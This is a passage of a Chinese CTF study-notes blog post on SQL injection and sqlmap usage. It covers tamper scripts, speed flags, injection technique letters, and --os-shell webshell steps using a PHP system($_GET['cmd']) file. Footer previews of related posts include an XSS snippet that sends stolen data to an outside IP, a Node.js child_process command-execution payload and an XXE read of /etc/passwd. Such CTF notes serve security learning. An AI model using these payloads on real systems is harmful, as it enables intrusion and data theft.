class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    <span class="comment">--仅修改payload</span></span><br></pre></td></tr></table></figure><h4 id="4-kwargs参数-修改请求头数据"><a href="#4-kwargs参数-修改请求头数据" class="headerlink" title="4.kwargs参数(修改请求头数据):"></a>4.kwargs参数(修改请求头数据):</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这个参数可以修改请求头数据中的其他参数，前面的payload参数操作只体现在 url 上</span><br><span class="line">通过 kwargs 对请求头中的参数进行修改，要先理解 kwargs 是一个字典，可能要学习一下 python 里的字典知识</span><br><span class="line">kwargs 字典结构为：</span><br><span class="line">&#123;<span class="string">&#x27;headers&#x27;</span>: &#123;&#125;, <span class="string">&#x27;delimiter&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;hints&#x27;</span>: &#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">修改请求头中 <span class="keyword">User</span><span class="operator">-</span>Agent 参数值：</span><br><span class="line">headers <span class="operator">=</span> kwargs.get(&quot;header&quot;,&#123;&#125;)</span><br><span class="line">headers[<span class="string">&#x27;User-Agent&#x27;</span>]<span class="operator">=</span>&quot;你要改的值&quot;</span><br></pre></td></tr></table></figure><h3 id="2-一些常用参数"><a href="#2-一些常用参数" class="headerlink" title="2.一些常用参数:"></a>2.一些常用参数:</h3><h4 id="1-优化，加快速度"><a href="#1-优化，加快速度" class="headerlink" title="1.优化，加快速度:"></a>1.优化，加快速度:</h4><h5 id="1-keep-alive"><a href="#1-keep-alive" class="headerlink" title="1.-keep-alive:"></a>1.-keep-alive:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">保持长连接，加快速度</span><br></pre></td></tr></table></figure><h5 id="2-–threads"><a href="#2-–threads" class="headerlink" title="2.–threads"></a>2.–threads</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多线程，加速</span><br></pre></td></tr></table></figure><h4 id="不使用缓存（–flush-session）"><a href="#不使用缓存（–flush-session）" class="headerlink" title="不使用缓存（–flush-session）:"></a>不使用缓存（–flush-session）:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--flush-session    不让sqlmap使用缓存内容</span></span><br></pre></td></tr></table></figure><h4 id="一键getshell"><a href="#一键getshell" class="headerlink" title="一键getshell:"></a>一键getshell:</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--os-shell    </span></span><br></pre></td></tr></table></figure><table><thead><tr><th>阶段</th><th>描述</th></tr></thead><tbody><tr><td>① 识别注入点</td><td>通过注入参数（如 <code>id=1</code>），确定注入类型（Boolean-Based &#x2F; Union &#x2F; Error-Based 等）</td></tr><tr><td>② 探测数据库类型</td><td>MySQL、PostgreSQL、MSSQL、Oracle，不同类型决定后续利用方法</td></tr><tr><td>③ 尝试文件写入</td><td>用 SQL 语句写 PHP 文件到 web 目录（如 <code>/var/www/html/</code>）</td></tr><tr><td>④ 上传 WebShell</td><td>写入包含 <code>system($_GET[&#39;cmd&#39;])</code> 的 PHP 文件</td></tr><tr><td>⑤ 验证 WebShell 是否成功</td><td>用 HTTP 请求访问 <code>webshell.php?cmd=whoami</code> 来判断是否能执行命令</td></tr><tr><td>⑥ 启动命令控制交互</td><td>自动用 URL + <code>cmd=</code> 参数反复提交命令，实现 shell 操作（但不是交互式真实 shell，是伪 shell）</td></tr></tbody></table><h4 id="Sqlmap-注入技术参数-–technique"><a href="#Sqlmap-注入技术参数-–technique" class="headerlink" title="Sqlmap 注入技术参数(–technique):"></a>Sqlmap 注入技术参数(–technique):</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--technique    </span></span><br><span class="line">B：<span class="type">Boolean</span><span class="operator">-</span>based blind（布尔型注入）</span><br><span class="line">E：Error<span class="operator">-</span>based（报错型注入）</span><br><span class="line">U：<span class="keyword">Union</span> query<span class="operator">-</span>based（可联合查询注入）</span><br><span class="line">S：Stacked queries（可多语句查询注入）</span><br><span class="line">T：<span class="type">Time</span><span class="operator">-</span>based blind（基于时间延迟注入）</span><br><span class="line">Q：Inline queries（嵌套查询注入）</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.wanyanai.top">wan yan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.wanyanai.top/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/">https://blog.wanyanai.top/2025/06/02/ctfshow/sql%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.wanyanai.top" target="_blank">wanyanblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post-share"><div class="social-share" data-image="/img/content.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/02/ctfshow/xss/" title="xss"><img class="cover" src="/img/content.png" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">xss</div></div><div class="info-2"><div class="info-item-1">常见过滤:如果使用了http-only:1.GET请求外带:GET外带： 12345678// GET方式外带接口返回的数据var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;接口&#x27;, false); xhr.send(null);if (xhr.status === 200) &#123; var t = xhr.responseText; new Image().src = &#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27; + encodeURIComponent(t.slice(0, 2000));&#125; POST外带: 123456789101112// POST方式外带接口返回的数据var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;/api/?page=1&amp;limit=10&#x27;,...</div></div></div></a><a class="pagination-related" href="/2025/06/02/ctfshow/xxe/" title="xxe"><img class="cover" src="/img/content.png" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">xxe</div></div><div class="info-2"><div class="info-item-1">xxe的原理:可以通过构造恶意 XML 数据，引入外部实体来实现： 读取本地敏感文件（如 /etc/passwd） 进行内网 SSRF 拒绝服务（Billion Laughs） 执行系统命令（少见，取决于 parser） 1.xxe的前提:12345libxml_disable_entity_loader(false); --允许加载外部实体（XXE的前提）if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键 2.常见的攻击方式: 类型 描述 示例 📁 本地文件读取 读取敏感文件 file:///etc/passwd 🌐 SSRF 访问内网资源 http://127.0.0.1/admin 💣...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/02/ctfshow/nodejs/" title="nodejs"><img class="cover" src="/img/content.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">nodejs</div></div><div class="info-2"><div class="info-item-1">语法函数:1.eval()函数:1234执行 JS 表达式/代码字符串require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString() --普通的用于eval()global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;).toString() 特性 eval() child_process.exec() &#x2F; execSync() 等 功能 执行 JS 表达式&#x2F;代码字符串 执行系统命令，调用 shell 执行环境 JavaScript 运行时 操作系统 shell（bash&#x2F;cmd） 数据类型 仅 JS 数据（字符串、对象等） 任意系统命令输出（Buffer&#x2F;String） 返回值 JS 表达式的结果 子进程的输出（stdout） 安全风险 高 ——...</div></div></div></a><a class="pagination-related" href="/2025/06/02/ctfshow/ssrf/" title="ssrf"><img class="cover" src="/img/content.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">ssrf</div></div><div class="info-2"><div class="info-item-1">SSRF的运用原理:1.原理:利用存在漏洞的服务器，向内部或外部资源发送伪造的请求，从而达到以下目的： 探测内网结构（端口扫描、服务发现） 访问内网API（如云服务元数据接口） 进行身份伪造（访问携带身份信息的资源） 造成DoS、反弹请求等攻击 2.常用检测方法: 检测类型 方法 描述 检测是否成功的方式 绕过思路 🌐 常见 访问内网地址 127.0.0.1、localhost、169.254.169.254、内网IP段等 返回内容、响应时间差 使用整数、16进制、[::]等变体绕过 🌐 常见 DNSlog平台检测 传入外部 DNS 地址（如 xx.ceye.io） DNS平台记录到解析请求 域名跳转、伪协议等规避安全策略 🌐 常见 HTTP外带检测 构造 URL 发起外部 HTTP 请求 服务器访问日志、Burp Collaborator、tcpdump 基于 SSRF 的跳转链 🌐 常见 文件协议 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 等 如果读取内容返回，证明存在...</div></div></div></a><a class="pagination-related" href="/2025/06/02/ctfshow/xss/" title="xss"><img class="cover" src="/img/content.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">xss</div></div><div class="info-2"><div class="info-item-1">常见过滤:如果使用了http-only:1.GET请求外带:GET外带： 12345678// GET方式外带接口返回的数据var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;接口&#x27;, false); xhr.send(null);if (xhr.status === 200) &#123; var t = xhr.responseText; new Image().src = &#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27; + encodeURIComponent(t.slice(0, 2000));&#125; POST外带: 123456789101112// POST方式外带接口返回的数据var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;/api/?page=1&amp;limit=10&#x27;,...</div></div></div></a><a class="pagination-related" href="/2025/06/02/ctfshow/xxe/" title="xxe"><img class="cover" src="/img/content.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">xxe</div></div><div class="info-2"><div class="info-item-1">xxe的原理:可以通过构造恶意 XML 数据，引入外部实体来实现： 读取本地敏感文件（如 /etc/passwd） 进行内网 SSRF 拒绝服务（Billion Laughs） 执行系统命令（少见，取决于 parser） 1.xxe的前提:12345libxml_disable_entity_loader(false); --允许加载外部实体（XXE的前提）if(isset($xmlfile))&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键 2.常见的攻击方式: 类型 描述 示例 📁 本地文件读取 读取敏感文件 file:///etc/passwd 🌐 SSRF 访问内网资源 http://127.0.0.1/admin 💣...</div></div></div></a><a class="pagination-related" href="/2025/06/02/ctfshow/ssti/" title="ssti"><img class="cover" src="/img/content.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">ssti</div></div><div class="info-2"><div class="info-item-1">常见检测: 语言 模板引擎 示例 Payload Python Jinja2 &#123;&#123;7*7&#125;&#125; → 49 Python Mako $&#123;7*7&#125; → 49 PHP Smarty &#123;$smarty.version&#125; Java FreeMarker $&#123;7*7&#125; → 49 Java Velocity #set($x=7*7) $x Node.js EJS &lt;%= 7*7 %&gt; 各个模块:1.jinja2:123456控制结构 &#123;% %&#125;变量取值 &#123;&#123; &#125;&#125;注释 &#123;# #&#125;查看所有模块:&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125; 1. Python 2.71....</div></div></div></a><a class="pagination-related" href="/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="常用姿势"><img class="cover" src="/img/content.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="info-item-2">常用姿势</div></div><div class="info-2"><div class="info-item-1">php1.sprintf函数:12作用是将格式化字符串写入变量中函数形式为sprintf(format,arg1,arg2,arg++) 123456789不带占位符:&lt;?php$sql=&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;; $user=&#x27;admin&#x27;;echo sprintf($sql,$user); /* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;*/?&gt;有占位符: %1$\ 是一样的道理%1$\会消失 12345678//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL&lt;?php$pass=sprintf(&quot;and...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/wanyan.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info-name">wan yan</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/wan1yan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/wan1yan" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">常见过滤绕过:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%B9%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.对空格的绕过:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AF%B9%E2%80%93-%E5%92%8C-%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.对–+和#的过滤:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%B9where%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.对where的替代:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8having"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">1.使用having :</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8regexp"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">2.使用regexp:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AF%B9%E2%80%99%E2%80%99%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%BB%95%E8%BF%87-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.对’’字符串的绕过,字符串拼接:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%AF%B9%E6%95%B0%E5%AD%97%E7%9A%84%E8%BF%87%E6%BB%A4-%EF%BC%9A"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.对数字的过滤 ：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%AF%B9%E8%BE%93%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AEmd5"><span class="toc-number">1.1.6.</span> <span class="toc-text">6. 对输入的数据md5()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-mysql%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.mysql中字符串与数字进行比较:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-substr-%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.8.</span> <span class="toc-text">8.substr()函数的过滤:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E5%AF%B9%E7%AD%89%E5%8F%B7-%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.9.</span> <span class="toc-text">9.对等号&#x3D;的过滤:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E5%AF%B9sleep%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.10.</span> <span class="toc-text">10.对sleep的绕过;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E4%BD%BF%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.1.11.</span> <span class="toc-text">11.使用预处理语句执行字符串:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E5%AF%B9select%E7%9A%84%E7%BB%95%E8%BF%87-handler"><span class="toc-number">1.1.12.</span> <span class="toc-text">12.对select的绕过(handler):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-information-schema%E7%9A%84%E8%BF%87%E6%BB%A4-%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.13.</span> <span class="toc-text">13.information.schema的过滤(无列名查询):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-sql%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.14.</span> <span class="toc-text">14.sql写入文件:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mysql%EF%BC%9A"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">mysql：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">1.1.14.2.</span> <span class="toc-text">PostgreSQL:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Server"><span class="toc-number">1.1.14.3.</span> <span class="toc-text">SQL Server:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.15.</span> <span class="toc-text">15.读取文件:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">1.基础用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E6%9F%A5%E8%AF%A2%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.常见查询关键字:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.常见函数;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-%EF%BC%9B"><span class="toc-number">1.3.</span> <span class="toc-text">2.攻击方式 ；</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.联合注入:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">联合注入常见流程:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8like"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">可以直接使用like:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%AF%B9%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84%E8%BF%87%E6%BB%A4%E6%9B%BF%E6%8D%A2-replace"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">2.对返回结果的过滤替换(replace):</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%A6%82%E6%9E%9C%E5%AF%B9%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E6%9C%89%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%B0%86%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E7%9A%84%E5%85%B6%E4%BB%96%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">3.如果对返回结果有过滤，也可以将内容写入当前目录的其他的文件;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.布尔盲注:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1.判断方法:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.堆叠注入:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-row-0"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1.row(0):</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#row-0-%E7%9A%84%E7%9C%9F%E5%AE%9E%E5%90%AB%E4%B9%89%EF%BC%9A"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">$row[0] 的真实含义：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Mysql%E4%B8%8BLimit%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-ORDER-BY%E4%B9%8B%E5%90%8E"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.Mysql下Limit注入方法(ORDER BY之后)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84limit"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">1.基于报错注入的limit:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2.基于时间注入;</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">常见查询用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E8%AF%A2%E6%9F%90%E5%BC%A0%E8%A1%A8%E4%B8%AD%E5%90%8D%E4%B8%BApass%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-number">2.1.</span> <span class="toc-text">1.查询某张表中名为pass的字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">2.通配符:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E8%AF%A2%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">3.查询文件内容函数:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-file-%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.1.</span> <span class="toc-text">load_file()查询函数:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-%E6%8F%90%E5%8F%96%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.2.</span> <span class="toc-text">substr()提取函数:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%89%E5%85%83%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.4.</span> <span class="toc-text">4.三元表达式;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%89%E5%87%A0%E5%BC%A0%E8%A1%A8-%E5%AD%97%E6%AE%B5"><span class="toc-number">2.5.</span> <span class="toc-text">5.查询当前数据库有几张表(字段):</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%86%E9%A1%B5limit%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">2.6.</span> <span class="toc-text">6.分页limit的用法:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">sqlmap的使用:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-tamper%E7%9A%84%E5%86%99%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">1.tamper的写法:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.基本结构:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-PRIORITY%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.PRIORITY优先级:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8Epayload%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.基于payload的绕过:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-kwargs%E5%8F%82%E6%95%B0-%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%95%B0%E6%8D%AE"><span class="toc-number">3.1.4.</span> <span class="toc-text">4.kwargs参数(修改请求头数据):</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">2.一些常用参数:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BC%98%E5%8C%96%EF%BC%8C%E5%8A%A0%E5%BF%AB%E9%80%9F%E5%BA%A6"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.优化，加快速度:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-keep-alive"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">1.-keep-alive:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 